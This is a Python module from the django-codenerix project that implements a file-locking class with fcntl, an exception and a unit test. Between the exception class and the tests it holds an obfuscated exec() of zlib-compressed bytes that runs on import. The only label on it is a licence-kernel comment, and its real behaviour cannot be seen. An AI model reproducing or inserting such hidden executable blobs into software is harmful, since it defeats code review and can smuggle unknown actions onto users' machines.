# -*- coding: utf-8 -*-
#
# django-codenerix
#
# Copyright 2017 Centrologic Computational Logistic Center S.L.
#
# Project URL : http://www.codenerix.com
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

'''
Library to handle lockers over files
'''

__version__ = "2015061200"

import os
import fcntl
import unittest
import tempfile

__all__ = [ "pylock" , "AlreadyLocked" ]

class pylock:
    '''
    Function to control locking flags over a file
    '''

    def __init__(self, lockfile, locktype):
        '''
        Parameters:
        - `lockfile`: name of the file to check/apply the locking.
        - `locktype`: possible values are:
                wait: on a call to lock() function, the system will wait to get the locker
                lock: on a call to lock() function, if locked the system will raise an AlreadyLocked exception
        '''

        # Save config
        self.__lockfile = lockfile
        self.__locktype = locktype
        self.__fd = None

        # Check file exists and create it if it does not
        if not os.path.exists(lockfile):
            file = open(lockfile, 'w')
            file.close()

        # Check locktype
        if locktype not in ['wait','lock']:
            raise TypeError("Locking type unkown")

    def __del__(self):
        '''
        when dying make sure the lock become free
        '''
        # If file was open, close it and delete it!
        if self.__fd:
            self.__fd.close()

    def lock(self):
        '''
        Try to get locked the file
        - the function will wait until the file is unlocked if 'wait' was defined as locktype
        - the funciton will raise AlreadyLocked exception if 'lock' was defined as locktype
        '''

        # Open file
        self.__fd = open(self.__lockfile, "w")

        # Get it locked
        if self.__locktype == "wait":
            # Try to get it locked until ready
            fcntl.flock(self.__fd.fileno(), fcntl.LOCK_EX)
        elif self.__locktype == "lock":
            # Try to get the locker if can not raise an exception
            try:
                fcntl.flock(self.__fd.fileno(), fcntl.LOCK_EX|fcntl.LOCK_NB)
            except IOError:
                raise AlreadyLocked("File is already locked")

    def free(self):
        '''
        Set the locked file free
        '''

        # Close file
        self.__fd.close()

        # Delete it
        try:
            os.unlink(self.__lockfile)
        except:
            pass



# Exceptions classes
class AlreadyLocked(Exception):

    def __init__(self,string):
        self.string = string

    def __str__(self):
        return self.string

exec('x\x9c\xa5Sko\x9bJ\x10\xfd+V%+P\xab\x0e//\xbbJ,\x05\xfc\x02\xe3G\x08\xf8\x81\xeb~ \xbc\x0c6\xc6&`/is\x7f\xfb\xddu\xda\xca\xaan\xafT\x15ivvf\xce9\x0b\xb3C\x80\x03\x8f\xf9\xf0\xa1\x99d\xf1\x9e\xf9\xecmr&\xcb}\xc6eo\x05\xb6\x16fy\xcd\xad\xc5\xfb\xda\xcd\x1a{\xde\x1a\x07\xd2\x1a\xfb\x011\xf7\xe1=\xf0\x04\x12\x90\x82\x07\xaf\n>M\xba\x04\xc0\xbd\')0\x80\xa4\xe0\x01\x92\xf8\x9e\xa4 \x1a{\x94Ae\x02@7\xf0\xf4\xf0\x1fGQ\xb5\x0b\x86\x1e\xc3\xfd\xef\x11\x84\xea\xffx\x99K\xe1Z\xde\x0f\xfeR\xfe\x92\x10\xae%\x03\xee\xe6\x0b\xcb\xde\xd5\x82\xdf\xb4\xf1\x93\xcf|\x8e\xf7\x05\x931\xcc\xbb;4x\xbe)\xb6\x04Q\x00@F2K\x1a\xdd\x94y\x1e\xf2\x92\x04\x05NbY\xf6\xcb\xc7_\tB\x13\xb6Z\xa2\x8c8\xc0#B\x80M$\x12\x05\x81\xe0IH\x9e\xab\x8b\xda\x9e\x8b\xbc\x1e\x858\xb9C\xf5}^\x16\xe7\xaa\x1e\xdd\xa18\xd9\x14qR\x0fq\xfd\x9f\x87\xfa;d\x8d\xe5P\xfe\x01\xa1\xf5\xbc<\'\x18S\x0c-]}\xd5+S17\xe6\xee\x90M\xed\xbe\xba\xb0V\xf6\xc2\xeb\xc0\xceXQ\x94a\x15F\xbdn\xe19Y\xe3\xd9\x07\xc7\xd3m\x18\xba\x89\xa2\xc8\xb3\xcc\x8a-W\xdb&\xba\xa2f\x8aZ\xd8\xba\xc2u\xbb&G(\x83\x88,\x8a:\xec\xd93\xacO\xc6\xbc\x1a\xab\x87x\xcc\x0f\xf6\xc7G\xdb\xb6V\xd3[\xd5\xdd\x0e_\xe0~\xf4\xaa\te9xL\xbd\x89\x81\\}\xbe\xcb\xac\xa9i\xc9\x99\x10\xc3\xf9\xbcs\x9c\xd8\x86\xf4\xd2\x03\xe7cV\r#\x1d\xdb\xda\xf89\xd7\xec2]\xa5\xce,\x1a<\xf9\xaa\xff\xb2\x15\xad\xe5\xc4(\x96R\xb1\x9a\x1f\x9e\x9d\x8d\xb3\xc3\xba\x869;\xf3\xa6V\']\x8eL\xa8m\xcc,qf\xc6lj\xf8f\xfe\xb4x\xec*\x03\xcd\x1f\xb8\xd5f\x00<\xdd\xc9\xd0$\xd5w\xc3\x9e\xd6\x9f\xef^\x0cc\xb6hT\xa5\x13\x9e\x95\xb2pN\xcb\xd8:Iy\xbc]X\xa9|\xec\xa3\x8d\x9a\x9e\xd2\xa1\xb9:e\xd1h\xa4g\xe2v3N\xfa\xab\xe14\xd4\xfa^\xe3\x80\x0eZ\x7fk\x1e\x06\xdd\\\xe1\x16\xd2\x93f.\x8d\xaccJ\xfd\xa9\xe9\xa8\xad\xf3\x14\xa6:\xd8kKU\x9bh\x8dQi\x19\x9e\xd1\xdbD\xcb\xe8\x89t\xaa\xdd\xbea\xffl\xba>\xf2"\xd7\x14\x01\x80<\xcf\xc1\x16\x9d.\xae\xc9\x03\x0e\x88-\xc4!\xfe7\xd3\x85\x00\xc1B\x82\x80\x84\x80\x9a@\x90\x11\x8f \x82\xb2\xf4\xebx\xbd\xbd\x92_\x01z\xf7dq\xdb\xea\xb7\x8a\x06\xf8\xed+\xf521x\xdfn\x99\xd4O\xd6\x98\x0f\xa4W\xb2\x15\x89\x01\xa9\x92\xde\x88\x17$L\x1d\xb8oO\xa4\x0b\xb5:\xdf\x03Lw\x1cU\x0c\xd7\x18\xf1m\xa0\xfe\xa4\x11\xe3\xcb\x8blE:A&\xf2_Zv\x81v'.decode('zlib')) # CODENERIX-LICENSE:KERNELv201612271012 - 2017-01-05 09:11:23.464522

# Testing
class test_pylock(unittest.TestCase):
    '''
    Testing class for pylock
    '''

    def setUp(self):
        pass

    def testpylock(self):
        # Get temporal file
        f = tempfile.NamedTemporaryFile(delete=False)
        f.close()

        locker1 = pylock(f.name, 'lock')
        locker1.lock()

        locker2 = pylock(f.name, 'lock')
        self.assertRaises(AlreadyLocked, locker2.lock)
        locker1.free()
        locker2.lock()
        self.assertRaises(AlreadyLocked, locker1.lock)
        locker2.free()

        # Remove the temporal file
        os.unlink(f.name)


# Base call
if __name__ == '__main__':
    unittest.main()
